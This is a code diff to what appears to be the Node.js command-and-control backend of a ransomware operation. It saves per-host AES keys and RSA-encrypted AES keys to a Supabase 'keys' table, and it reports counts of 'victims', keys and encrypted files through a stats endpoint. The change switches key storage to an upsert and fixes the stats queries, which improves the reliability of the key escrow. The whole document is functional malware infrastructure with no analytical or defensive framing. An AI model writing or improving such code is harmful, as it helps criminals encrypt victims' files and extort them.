@@ -109,21 +109,23 @@ async function saveKey(data) {
     console.log('[Supabase] saveKey skipped - no client');
     return;
   }
-  console.log('[Supabase] Saving key for:', data.hostname);
+  console.log(`[Supabase] Saving key for: ${data.hostname} | UUID: ${data.uuid} | AES: ${data.aes_key ? 'YES' : 'NULL'} | RSA-Enc: ${data.encrypted_aes_key ? 'YES' : 'NULL'}`);
   try {
-    const { error } = await supabase.from('keys').insert({
+    const { error } = await supabase.from('keys').upsert({
       uuid: data.uuid,
-      socket_id: data.socketId,
       hostname: data.hostname,
-      aes_key: data.aesKey
-    });
-    if (error && !error.message.includes('duplicate')) {
-      console.log(`[DB Error] keys: ${error.message}`);
+      aes_key: data.aes_key,
+      encrypted_aes_key: data.encrypted_aes_key,
+      created_at: new Date().toISOString()
+    }, { onConflict: 'uuid' });
+
+    if (error) {
+      console.error(`[DB Error] keys upsert: ${error.message}`);
     } else {
-      console.log('[Supabase] Key saved successfully');
+      console.log(`[Supabase] Key saved/updated successfully for ${data.hostname}`);
     }
   } catch (e) {
-    console.log(`[DB Failed] keys: ${e.message}`);
+    console.error(`[DB Exception] keys: ${e.message}`);
   }
 }
 
@@ -532,20 +534,26 @@ app.get('/api/db/stats', async (req, res) => {
     return res.json({ success: false, victims: 0, keys: 0, encrypted: 0 });
   }
   try {
-    // Debug info
-    if (v.error) console.error('[Stats Error] Victims:', v.error);
-    if (k.error) console.error('[Stats Error] Keys:', k.error);
-    if (e.error) console.error('[Stats Error] Encrypted:', e.error);
+    const [victimsResult, keysResult, encryptedResult] = await Promise.all([
+      supabase.from('victims').select('*', { count: 'exact', head: true }),
+      supabase.from('keys').select('*', { count: 'exact', head: true }),
+      supabase.from('encrypted_files').select('*', { count: 'exact', head: true })
+    ]);
+
+    // Debug any errors
+    if (victimsResult.error) console.error('[Stats Error] Victims:', victimsResult.error.message);
+    if (keysResult.error) console.error('[Stats Error] Keys:', keysResult.error.message);
+    if (encryptedResult.error) console.error('[Stats Error] Encrypted:', encryptedResult.error.message);
 
     res.json({
       success: true,
-      victims: v.count || 0,
-      keys: k.count || 0,
-      encrypted: e.count || 0
+      victims: victimsResult.count || 0,
+      keys: keysResult.count || 0,
+      encrypted: encryptedResult.count || 0
     });
-  } catch (e) {
-    console.error('[Stats Exception]', e);
-    res.json({ success: false, victims: 0, keys: 0, encrypted: 0, error: e.message });
+  } catch (err) {
+    console.error('[Stats Exception]', err.message);
+    res.json({ success: false, victims: 0, keys: 0, encrypted: 0, error: err.message });
   }
 });
 
